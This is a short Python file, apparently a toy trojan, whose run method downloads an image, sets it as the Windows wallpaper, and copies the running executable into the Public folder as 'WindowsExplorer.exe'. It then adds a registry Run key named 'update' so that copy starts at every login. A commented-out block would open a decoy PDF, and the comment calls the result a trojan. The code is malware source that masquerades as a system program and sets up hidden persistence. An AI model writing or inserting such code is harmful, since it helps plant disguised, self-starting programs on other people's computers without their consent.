import ctypes
import subprocess
import urllib.request
import os
import sys
import shutil


class BackgroundSwitch:

    def run(self):
        # Will not run from python, enable for executable, creates a trojan
        # file_name = sys._MEIPASS + "\sample.pdf"
        # subprocess.Popen(file_name, shell=True)

        link = "http://www.tutorialspanel.com/wp-content/uploads/2018/02/test.jpg"
        down_dest = "C:/Users/Public/test.jpg"

        urllib.request.urlretrieve(link, down_dest)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, down_dest, 0)
        evil_file_location = os.environ["Public"] + "\\WindowsExplorer.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('REG ADD HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "' + evil_file_location + '"',shell=True)


